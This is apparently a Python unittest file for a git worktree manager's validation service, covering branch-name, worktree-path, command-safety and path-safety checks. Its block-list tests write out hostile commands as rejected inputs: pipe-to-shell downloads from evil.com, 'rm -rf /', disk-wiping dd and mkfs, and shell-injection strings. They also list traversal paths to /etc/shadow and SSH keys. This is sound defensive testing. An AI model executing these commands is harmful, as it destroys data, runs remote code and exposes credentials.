"""Tests for ValidationService."""

import stat
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path
from unittest.mock import Mock, patch

from wt_manager.services.validation_service import ValidationService
from wt_manager.utils.path_manager import PathManager


class TestValidationService(unittest.TestCase):
    """Test cases for ValidationService."""

    def setUp(self):
        """Set up test fixtures."""
        self.service = ValidationService()
        self.service.initialize()

    def test_initialization(self):
        """Test service initialization."""
        service = ValidationService()
        self.assertFalse(service.is_initialized())

        service.initialize()
        self.assertTrue(service.is_initialized())

    def test_validate_git_repository_empty_path(self):
        """Test validation with empty path."""
        result = self.service.validate_git_repository("")
        self.assertFalse(result.is_valid)
        self.assertEqual(result.details["error_type"], "empty_path")

    def test_validate_git_repository_nonexistent_path(self):
        """Test validation with non-existent path."""
        result = self.service.validate_git_repository("/nonexistent/path")
        self.assertFalse(result.is_valid)
        self.assertEqual(result.details["error_type"], "path_not_found")

    def test_validate_git_repository_file_path(self):
        """Test validation with file path instead of directory."""
        with tempfile.NamedTemporaryFile() as temp_file:
            result = self.service.validate_git_repository(temp_file.name)
            self.assertFalse(result.is_valid)
            self.assertEqual(result.details["error_type"], "not_directory")

    def test_validate_git_repository_not_git_repo(self):
        """Test validation with directory that's not a Git repository."""
        with tempfile.TemporaryDirectory() as temp_dir:
            result = self.service.validate_git_repository(temp_dir)
            self.assertFalse(result.is_valid)
            self.assertEqual(result.details["error_type"], "not_git_repo")

    @patch("subprocess.run")
    def test_validate_git_repository_valid_repo(self, mock_run):
        """Test validation with valid Git repository."""
        mock_run.return_value = Mock(returncode=0, stderr="")

        with tempfile.TemporaryDirectory() as temp_dir:
            # Create .git directory
            git_dir = Path(temp_dir) / ".git"
            git_dir.mkdir()

            result = self.service.validate_git_repository(temp_dir)
            self.assertTrue(result.is_valid)
            self.assertIn("path", result.details)

    @patch("subprocess.run")
    def test_validate_git_repository_git_command_fails(self, mock_run):
        """Test validation when git command fails."""
        mock_run.return_value = Mock(returncode=1, stderr="Not a git repository")

        with tempfile.TemporaryDirectory() as temp_dir:
            # Create .git directory
            git_dir = Path(temp_dir) / ".git"
            git_dir.mkdir()

            result = self.service.validate_git_repository(temp_dir)
            self.assertFalse(result.is_valid)
            self.assertEqual(result.details["error_type"], "git_validation_failed")

    def test_validate_worktree_path_empty(self):
        """Test worktree path validation with empty path."""
        result = self.service.validate_worktree_path("")
        self.assertFalse(result.is_valid)
        self.assertEqual(result.details["error_type"], "empty_path")

    def test_validate_worktree_path_file_exists(self):
        """Test worktree path validation when path exists as file."""
        with tempfile.NamedTemporaryFile() as temp_file:
            result = self.service.validate_worktree_path(temp_file.name)
            self.assertFalse(result.is_valid)
            self.assertEqual(result.details["error_type"], "path_is_file")

    def test_validate_worktree_path_directory_not_empty(self):
        """Test worktree path validation when directory is not empty."""
        with tempfile.TemporaryDirectory() as temp_dir:
            # Create a file in the directory
            test_file = Path(temp_dir) / "test.txt"
            test_file.write_text("test")

            result = self.service.validate_worktree_path(temp_dir)
            self.assertFalse(result.is_valid)
            self.assertEqual(result.details["error_type"], "directory_not_empty")

    def test_validate_worktree_path_parent_not_found(self):
        """Test worktree path validation when parent directory doesn't exist."""
        result = self.service.validate_worktree_path("/nonexistent/parent/child")
        self.assertFalse(result.is_valid)
        self.assertEqual(result.details["error_type"], "parent_not_found")

    def test_validate_worktree_path_valid(self):
        """Test worktree path validation with valid path."""
        with tempfile.TemporaryDirectory() as temp_dir:
            new_path = Path(temp_dir) / "new_worktree"
            result = self.service.validate_worktree_path(str(new_path))
            self.assertTrue(result.is_valid)

    def test_validate_branch_name_empty(self):
        """Test branch name validation with empty name."""
        result = self.service.validate_branch_name("")
        self.assertFalse(result.is_valid)
        self.assertEqual(result.details["error_type"], "empty_branch")

    def test_validate_branch_name_too_long(self):
        """Test branch name validation with too long name."""
        long_name = "a" * 251
        result = self.service.validate_branch_name(long_name)
        self.assertFalse(result.is_valid)
        self.assertEqual(result.details["error_type"], "branch_too_long")

    def test_validate_branch_name_starts_with_dash(self):
        """Test branch name validation with name starting with dash."""
        result = self.service.validate_branch_name("-invalid")
        self.assertFalse(result.is_valid)
        self.assertEqual(result.details["error_type"], "invalid_pattern")

    def test_validate_branch_name_contains_double_dots(self):
        """Test branch name validation with double dots."""
        result = self.service.validate_branch_name("feature..branch")
        self.assertFalse(result.is_valid)
        self.assertEqual(result.details["error_type"], "invalid_pattern")

    def test_validate_branch_name_contains_whitespace(self):
        """Test branch name validation with whitespace."""
        result = self.service.validate_branch_name("feature branch")
        self.assertFalse(result.is_valid)
        self.assertEqual(result.details["error_type"], "invalid_pattern")

    def test_validate_branch_name_reserved_name(self):
        """Test branch name validation with reserved name."""
        result = self.service.validate_branch_name("HEAD")
        self.assertFalse(result.is_valid)
        self.assertEqual(result.details["error_type"], "reserved_name")

    def test_validate_branch_name_valid(self):
        """Test branch name validation with valid names."""
        valid_names = [
            "feature/new-feature",
            "bugfix/issue-123",
            "main",
            "develop",
            "release/v1.0.0",
            "hotfix/critical-fix",
        ]

        for name in valid_names:
            with self.subTest(name=name):
                result = self.service.validate_branch_name(name)
                self.assertTrue(
                    result.is_valid, f"Branch name '{name}' should be valid"
                )

    def test_check_uncommitted_changes_empty_path(self):
        """Test uncommitted changes check with empty path."""
        result = self.service.check_uncommitted_changes("")
        self.assertFalse(result.is_valid)
        self.assertEqual(result.details["error_type"], "empty_path")

    def test_check_uncommitted_changes_nonexistent_path(self):
        """Test uncommitted changes check with non-existent path."""
        result = self.service.check_uncommitted_changes("/nonexistent/path")
        self.assertFalse(result.is_valid)
        self.assertEqual(result.details["error_type"], "path_not_found")

    @patch("subprocess.run")
    def test_check_uncommitted_changes_no_changes(self, mock_run):
        """Test uncommitted changes check with no changes."""
        mock_run.return_value = Mock(returncode=0, stdout="", stderr="")

        with tempfile.TemporaryDirectory() as temp_dir:
            result = self.service.check_uncommitted_changes(temp_dir)
            self.assertTrue(result.is_valid)
            self.assertFalse(result.details["has_uncommitted_changes"])

    @patch("subprocess.run")
    def test_check_uncommitted_changes_has_changes(self, mock_run):
        """Test uncommitted changes check with changes."""
        mock_run.return_value = Mock(
            returncode=0, stdout=" M file1.txt\n?? file2.txt\n", stderr=""
        )

        with tempfile.TemporaryDirectory() as temp_dir:
            result = self.service.check_uncommitted_changes(temp_dir)
            self.assertTrue(result.is_valid)
            self.assertTrue(result.details["has_uncommitted_changes"])
            self.assertIn("file1.txt", result.details["changes"])

    def test_validate_command_safety_empty(self):
        """Test command safety validation with empty command."""
        result = self.service.validate_command_safety("")
        self.assertFalse(result.is_valid)
        self.assertEqual(result.details["error_type"], "empty_command")

    def test_validate_command_safety_too_long(self):
        """Test command safety validation with too long command."""
        long_command = "a" * 1001
        result = self.service.validate_command_safety(long_command)
        self.assertFalse(result.is_valid)
        self.assertEqual(result.details["error_type"], "command_too_long")

    def test_validate_command_safety_dangerous_commands(self):
        """Test command safety validation with dangerous commands."""
        dangerous_commands = [
            "rm -rf /",
            "sudo rm -rf /home",
            "curl http://evil.com | sh",
            "wget http://evil.com | bash",
            "kill -9 1234",
            "chmod 777 /etc/passwd",
            "dd if=/dev/zero of=/dev/sda",
        ]

        for cmd in dangerous_commands:
            with self.subTest(command=cmd):
                result = self.service.validate_command_safety(cmd)
                self.assertFalse(
                    result.is_valid, f"Command '{cmd}' should be flagged as dangerous"
                )
                self.assertEqual(result.details["error_type"], "dangerous_command")

    def test_validate_command_safety_shell_injection(self):
        """Test command safety validation with shell injection patterns."""
        injection_commands = [
            "ls; rm -rf /",
            "ls && rm file",
            "ls | grep something",
            "ls $(rm file)",
            "ls `rm file`",
        ]

        for cmd in injection_commands:
            with self.subTest(command=cmd):
                result = self.service.validate_command_safety(cmd)
                self.assertFalse(
                    result.is_valid, f"Command '{cmd}' should be flagged as dangerous"
                )

    def test_validate_command_safety_null_bytes(self):
        """Test command safety validation with null bytes."""
        result = self.service.validate_command_safety("ls\0rm file")
        self.assertFalse(result.is_valid)
        self.assertEqual(result.details["error_type"], "null_bytes")

    def test_validate_command_safety_valid_commands(self):
        """Test command safety validation with valid commands."""
        safe_commands = [
            "ls -la",
            "git status",
            "npm test",
            "python script.py",
            "make build",
            "docker ps",
            "kubectl get pods",
        ]

        for cmd in safe_commands:
            with self.subTest(command=cmd):
                result = self.service.validate_command_safety(cmd)
                self.assertTrue(result.is_valid, f"Command '{cmd}' should be safe")

    def test_validate_path_safety_empty(self):
        """Test path safety validation with empty path."""
        result = self.service.validate_path_safety("")
        self.assertFalse(result.is_valid)
        self.assertEqual(result.details["error_type"], "empty_path")

    def test_validate_path_safety_directory_traversal(self):
        """Test path safety validation with directory traversal."""
        dangerous_paths = [
            "../../../etc/passwd",
            "/etc/passwd",
            "~/../../etc/passwd",
            "/var/log/system.log",
            "/usr/bin/sudo",
        ]

        for path in dangerous_paths:
            with self.subTest(path=path):
                result = self.service.validate_path_safety(path)
                self.assertFalse(
                    result.is_valid, f"Path '{path}' should be flagged as unsafe"
                )

    def test_validate_path_safety_valid_paths(self):
        """Test path safety validation with valid paths."""
        safe_paths = [
            "project/src/main.py",
            "docs/readme.md",
            "build/output",
            "test/fixtures/data.json",
        ]

        for path in safe_paths:
            with self.subTest(path=path):
                result = self.service.validate_path_safety(path)
                self.assertTrue(result.is_valid, f"Path '{path}' should be safe")

    # Additional comprehensive tests for validation services

    @patch("subprocess.run")
    def test_validate_git_repository_timeout(self, mock_run):
        """Test Git repository validation with timeout."""
        mock_run.side_effect = subprocess.TimeoutExpired("git", 5)

        with tempfile.TemporaryDirectory() as temp_dir:
            # Create .git directory
            git_dir = Path(temp_dir) / ".git"
            git_dir.mkdir()

            result = self.service.validate_git_repository(temp_dir)
            self.assertFalse(result.is_valid)
            self.assertEqual(result.details["error_type"], "git_timeout")

    @patch("subprocess.run")
    def test_validate_git_repository_git_not_found(self, mock_run):
        """Test Git repository validation when Git is not installed."""
        mock_run.side_effect = FileNotFoundError("git command not found")

        with tempfile.TemporaryDirectory() as temp_dir:
            # Create .git directory
            git_dir = Path(temp_dir) / ".git"
            git_dir.mkdir()

            result = self.service.validate_git_repository(temp_dir)
            self.assertFalse(result.is_valid)
            self.assertEqual(result.details["error_type"], "git_not_found")

    def test_validate_git_repository_exception_handling(self):
        """Test Git repository validation with general exception."""
        # Use an invalid path that will cause an exception during resolution
        with patch("pathlib.Path.resolve", side_effect=OSError("Permission denied")):
            result = self.service.validate_git_repository("/some/path")
            self.assertFalse(result.is_valid)
            self.assertEqual(result.details["error_type"], "validation_exception")

    def test_validate_path_characters_windows_logic(self):
        """Test path character validation logic for Windows."""
        # Test the Windows character validation logic directly
        with patch("os.name", "nt"):
            with tempfile.TemporaryDirectory():
                # Create a mock path object that returns invalid characters when str() is called
                mock_path = Mock()
                mock_path.__str__ = Mock(return_value="path<invalid>chars")

                result = self.service._validate_path_characters(
                    mock_path, "original_path"
                )
                self.assertFalse(result.is_valid)
                self.assertEqual(result.details["error_type"], "invalid_characters")

    def test_validate_path_characters_unix_logic(self):
        """Test path character validation logic for Unix."""
        # Test the Unix character validation logic directly
        with patch("os.name", "posix"):
            # Create a mock path object that returns null bytes when str() is called
            mock_path = Mock()
            mock_path.__str__ = Mock(return_value="path\0with\0null")

            result = self.service._validate_path_characters(mock_path, "original_path")
            self.assertFalse(result.is_valid)
            self.assertEqual(result.details["error_type"], "invalid_characters")

    def test_validate_worktree_path_parent_not_writable(self):
        """Test worktree path validation when parent directory is not writable."""
        with tempfile.TemporaryDirectory() as temp_dir:
            parent_dir = Path(temp_dir) / "readonly_parent"
            parent_dir.mkdir()

            # Make parent directory read-only
            if sys.platform != "win32":
                parent_dir.chmod(stat.S_IRUSR | stat.S_IXUSR)  # Read and execute only

                child_path = parent_dir / "new_worktree"
                result = self.service.validate_worktree_path(str(child_path))
                self.assertFalse(result.is_valid)
                self.assertEqual(result.details["error_type"], "parent_not_writable")

                # Restore permissions for cleanup
                parent_dir.chmod(stat.S_IRWXU)

    def test_validate_worktree_path_empty_directory_valid(self):
        """Test worktree path validation with empty existing directory."""
        with tempfile.TemporaryDirectory() as temp_dir:
            empty_dir = Path(temp_dir) / "empty_dir"
            empty_dir.mkdir()

            result = self.service.validate_worktree_path(str(empty_dir))
            self.assertTrue(result.is_valid)

    def test_validate_branch_name_edge_cases(self):
        """Test branch name validation with additional edge cases."""
        edge_cases = [
            ("feature/", False, "invalid_pattern"),  # Ends with slash
            ("feature//branch", False, "invalid_pattern"),  # Double slashes
            ("feature@{branch}", False, "invalid_pattern"),  # Contains @{
            ("feature\\branch", False, "invalid_pattern"),  # Contains backslash
            ("feature\tbranch", False, "invalid_pattern"),  # Contains tab
            ("feature\nbranch", False, "invalid_pattern"),  # Contains newline
            ("ORIG_HEAD", False, "reserved_name"),  # Reserved name
            ("FETCH_HEAD", False, "reserved_name"),  # Reserved name
            ("MERGE_HEAD", False, "reserved_name"),  # Reserved name
            ("feature-123", True, None),  # Valid with numbers and dash
            ("feature_branch", True, None),  # Valid with underscore
            ("feature.branch", True, None),  # Valid with dot
        ]

        for branch_name, should_be_valid, expected_error in edge_cases:
            with self.subTest(branch=branch_name):
                result = self.service.validate_branch_name(branch_name)
                if should_be_valid:
                    self.assertTrue(
                        result.is_valid, f"Branch '{branch_name}' should be valid"
                    )
                else:
                    self.assertFalse(
                        result.is_valid, f"Branch '{branch_name}' should be invalid"
                    )
                    if expected_error:
                        self.assertEqual(result.details["error_type"], expected_error)

    def test_validate_branch_name_control_characters(self):
        """Test branch name validation with control characters."""
        control_chars = ["\x00", "\x01", "\x1f", "\x7f"]

        for char in control_chars:
            with self.subTest(char=repr(char)):
                branch_name = f"feature{char}branch"
                result = self.service.validate_branch_name(branch_name)
                self.assertFalse(result.is_valid)
                self.assertEqual(result.details["error_type"], "invalid_pattern")

    @patch("subprocess.run")
    def test_check_uncommitted_changes_git_status_fails(self, mock_run):
        """Test uncommitted changes check when git status fails."""
        mock_run.return_value = Mock(
            returncode=1, stdout="", stderr="fatal: not a git repository"
        )

        with tempfile.TemporaryDirectory() as temp_dir:
            result = self.service.check_uncommitted_changes(temp_dir)
            self.assertFalse(result.is_valid)
            self.assertEqual(result.details["error_type"], "git_status_failed")

    @patch("subprocess.run")
    def test_check_uncommitted_changes_timeout(self, mock_run):
        """Test uncommitted changes check with timeout."""
        mock_run.side_effect = subprocess.TimeoutExpired("git", 10)

        with tempfile.TemporaryDirectory() as temp_dir:
            result = self.service.check_uncommitted_changes(temp_dir)
            self.assertFalse(result.is_valid)
            self.assertEqual(result.details["error_type"], "git_timeout")

    @patch("subprocess.run")
    def test_check_uncommitted_changes_git_not_found(self, mock_run):
        """Test uncommitted changes check when Git is not installed."""
        mock_run.side_effect = FileNotFoundError("git command not found")

        with tempfile.TemporaryDirectory() as temp_dir:
            result = self.service.check_uncommitted_changes(temp_dir)
            self.assertFalse(result.is_valid)
            self.assertEqual(result.details["error_type"], "git_not_found")

    def test_check_uncommitted_changes_exception_handling(self):
        """Test uncommitted changes check with general exception."""
        with patch("pathlib.Path.resolve", side_effect=OSError("Permission denied")):
            result = self.service.check_uncommitted_changes("/some/path")
            self.assertFalse(result.is_valid)
            self.assertEqual(result.details["error_type"], "validation_exception")

    def test_validate_command_safety_additional_dangerous_patterns(self):
        """Test command safety validation with additional dangerous patterns."""
        additional_dangerous = [
            "mkfs.ext4 /dev/sda1",  # Format filesystem
            "fdisk /dev/sda",  # Disk partitioning
            "format C:",  # Windows format
            "rsync --delete source/ dest/",  # Rsync with delete
            "pkill -f python",  # Kill processes
            "killall -9 chrome",  # Kill all processes
            "chown root:root /etc/passwd",  # Change ownership
            "su - root",  # Switch user
            "sudo su",  # Sudo switch user
        ]

        for cmd in additional_dangerous:
            with self.subTest(command=cmd):
                result = self.service.validate_command_safety(cmd)
                self.assertFalse(
                    result.is_valid, f"Command '{cmd}' should be dangerous"
                )
                self.assertEqual(result.details["error_type"], "dangerous_command")

    def test_validate_command_safety_long_arguments(self):
        """Test command safety validation with extremely long arguments."""
        long_arg = "a" * 501
        command = f"ls {long_arg}"
        result = self.service.validate_command_safety(command)
        self.assertFalse(result.is_valid)
        self.assertEqual(result.details["error_type"], "long_argument")

    def test_validate_command_safety_whitespace_handling(self):
        """Test command safety validation handles whitespace correctly."""
        commands_with_whitespace = [
            "  ls -la  ",  # Leading/trailing whitespace
            "\tgit status\t",  # Tab characters
            "\ngit log\n",  # Newline characters
        ]

        for cmd in commands_with_whitespace:
            with self.subTest(command=repr(cmd)):
                result = self.service.validate_command_safety(cmd)
                self.assertTrue(
                    result.is_valid, f"Command '{cmd}' should be safe after trimming"
                )

    def test_validate_command_safety_case_insensitive_patterns(self):
        """Test command safety validation is case insensitive for dangerous patterns."""
        case_variants = [
            "RM -rf /",
            "Sudo rm file",
            "CHMOD 777 /etc",
            "Kill -9 1234",
        ]

        for cmd in case_variants:
            with self.subTest(command=cmd):
                result = self.service.validate_command_safety(cmd)
                self.assertFalse(
                    result.is_valid,
                    f"Command '{cmd}' should be flagged (case insensitive)",
                )

    def test_validate_path_safety_additional_suspicious_patterns(self):
        """Test path safety validation with additional suspicious patterns."""
        # Test paths that should be flagged by the current implementation
        suspicious_paths = [
            "/etc/passwd",  # System directory (already in implementation)
            "/var/log/system.log",  # System directory (already in implementation)
            "/usr/bin/sudo",  # System directory (already in implementation)
            "/bin/bash",  # System directory (already in implementation)
            "/sbin/init",  # System directory (already in implementation)
            "/root/.ssh/id_rsa",  # Root directory (already in implementation)
        ]

        for path in suspicious_paths:
            with self.subTest(path=path):
                result = self.service.validate_path_safety(path)
                self.assertFalse(result.is_valid, f"Path '{path}' should be suspicious")

    def test_validate_path_safety_relative_traversal_complex(self):
        """Test path safety validation with complex traversal patterns."""
        complex_traversals = [
            "dir/../../../etc/passwd",
            "./../../root/.ssh/id_rsa",
            "subdir/../../../../../../etc/shadow",
            "normal/path/../../../dangerous/path",
        ]

        for path in complex_traversals:
            with self.subTest(path=path):
                result = self.service.validate_path_safety(path)
                self.assertFalse(
                    result.is_valid, f"Path '{path}' should be flagged for traversal"
                )

    def test_validate_path_safety_exception_handling(self):
        """Test path safety validation with exception during resolution."""
        with patch("pathlib.Path.resolve", side_effect=OSError("Permission denied")):
            result = self.service.validate_path_safety("/some/path")
            self.assertFalse(result.is_valid)
            self.assertEqual(result.details["error_type"], "validation_exception")

    # OS-specific path resolution tests

    @patch("sys.platform", "darwin")
    def test_os_specific_path_resolution_macos(self):
        """Test OS-specific path resolution on macOS."""
        # Test that PathManager integration works correctly
        config_dir = PathManager.get_config_dir()
        expected_base = (
            Path.home() / "Library" / "Application Support" / "GitWorktreeManager"
        )
        self.assertEqual(config_dir, expected_base)

        # Test validation service can work with OS-specific paths
        test_path = str(config_dir / "test_project")
        result = self.service.validate_worktree_path(test_path)
        # Should be valid since parent (config_dir) should be creatable
        self.assertTrue(
            result.is_valid or result.details["error_type"] == "parent_not_found"
        )

    @patch("sys.platform", "win32")
    def test_os_specific_path_resolution_windows(self):
        """Test OS-specific path resolution on Windows."""
        config_dir = PathManager.get_config_dir()
        expected_base = Path.home() / "AppData" / "Roaming" / "GitWorktreeManager"
        self.assertEqual(config_dir, expected_base)

        # Test Windows-specific path validation with a path that should be flagged
        windows_system_path = (
            "/var/log/system.log"  # Use a path pattern that's in the validation
        )
        result = self.service.validate_path_safety(windows_system_path)
        # Should be flagged as suspicious
        self.assertFalse(result.is_valid)

    @patch("sys.platform", "linux")
    def test_os_specific_path_resolution_linux(self):
        """Test OS-specific path resolution on Linux."""
        config_dir = PathManager.get_config_dir()
        expected_base = Path.home() / ".config" / "GitWorktreeManager"
        self.assertEqual(config_dir, expected_base)

        # Test Linux-specific path validation
        linux_system_path = "/etc/systemd/system"
        result = self.service.validate_path_safety(linux_system_path)
        # Should be flagged as suspicious
        self.assertFalse(result.is_valid)

    def test_path_manager_integration_sanitization(self):
        """Test integration with PathManager for path sanitization."""
        dangerous_path = "../../../etc/passwd"

        # Test that validation service can handle paths that PathManager would sanitize
        result = self.service.validate_path_safety(dangerous_path)
        self.assertFalse(result.is_valid)

        # Test with a path that would be safe after sanitization
        with tempfile.TemporaryDirectory() as temp_dir:
            Path(temp_dir)
            safe_relative = "project/src/main.py"

            # This should be safe
            result = self.service.validate_path_safety(safe_relative)
            self.assertTrue(result.is_valid)

    def test_cross_platform_path_handling(self):
        """Test validation service handles cross-platform path differences."""
        # Test paths with different separators
        paths_to_test = [
            "project/subdir/file.txt",  # Unix style
            "project\\subdir\\file.txt",  # Windows style (should be normalized)
        ]

        for path in paths_to_test:
            with self.subTest(path=path):
                result = self.service.validate_path_safety(path)
                # Both should be handled consistently
                self.assertTrue(
                    result.is_valid, f"Path '{path}' should be handled cross-platform"
                )

    def test_repository_validation_with_git_file(self):
        """Test Git repository validation with .git file (worktree case)."""
        with tempfile.TemporaryDirectory() as temp_dir:
            # Create .git file instead of directory (as in worktrees)
            git_file = Path(temp_dir) / ".git"
            git_file.write_text("gitdir: /path/to/main/repo/.git/worktrees/branch")

            with patch("subprocess.run") as mock_run:
                mock_run.return_value = Mock(returncode=0, stderr="")
                result = self.service.validate_git_repository(temp_dir)
                self.assertTrue(result.is_valid)

    def test_worktree_path_validation_comprehensive(self):
        """Test comprehensive worktree path validation scenarios."""
        with tempfile.TemporaryDirectory() as temp_dir:
            base_path = Path(temp_dir)

            # Test various scenarios
            test_cases = [
                # (path_relative_to_base, should_be_valid, expected_error_type)
                ("new_worktree", True, None),  # Simple new directory
                ("nested/new_worktree", True, None),  # Nested new directory
                ("existing_empty", True, None),  # Existing empty directory
                ("existing_file", False, "path_is_file"),  # Existing file
                (
                    "existing_nonempty",
                    False,
                    "directory_not_empty",
                ),  # Non-empty directory
            ]

            # Set up test directories and files
            (base_path / "nested").mkdir()
            (base_path / "existing_empty").mkdir()
            (base_path / "existing_file").write_text("content")
            (base_path / "existing_nonempty").mkdir()
            (base_path / "existing_nonempty" / "file.txt").write_text("content")

            for path_rel, should_be_valid, expected_error in test_cases:
                with self.subTest(path=path_rel):
                    full_path = base_path / path_rel
                    result = self.service.validate_worktree_path(str(full_path))

                    if should_be_valid:
                        self.assertTrue(
                            result.is_valid, f"Path '{path_rel}' should be valid"
                        )
                    else:
                        self.assertFalse(
                            result.is_valid, f"Path '{path_rel}' should be invalid"
                        )
                        if expected_error:
                            self.assertEqual(
                                result.details["error_type"], expected_error
                            )

    def test_command_safety_validation_comprehensive(self):
        """Test comprehensive command safety validation."""
        # Test safe commands that should pass
        safe_commands = [
            "git status",
            "npm install",
            "python -m pytest",
            "make build",
            "docker build -t myapp .",
            "kubectl get pods",
            "terraform plan",
            "ansible-playbook site.yml",
            "mvn clean install",
            "gradle build",
            "cargo test",
            "go build",
            "rustc main.rs",
            "node index.js",
            "python3 script.py --verbose",
        ]

        for cmd in safe_commands:
            with self.subTest(command=cmd):
                result = self.service.validate_command_safety(cmd)
                self.assertTrue(
                    result.is_valid, f"Safe command '{cmd}' should be allowed"
                )

        # Test edge cases for dangerous patterns
        edge_case_dangerous = [
            "echo 'rm -rf /'",  # Quoted dangerous command (should still be safe)
            "ls && echo done",  # Shell operators
            "find . -name '*.py' | head -10",  # Pipes
            "echo $(date)",  # Command substitution
            "echo `date`",  # Backtick substitution
        ]

        for cmd in edge_case_dangerous:
            with self.subTest(command=cmd):
                result = self.service.validate_command_safety(cmd)
                # These should be flagged due to shell metacharacters
                self.assertFalse(result.is_valid, f"Command '{cmd}' should be flagged")


if __name__ == "__main__":
    unittest.main()
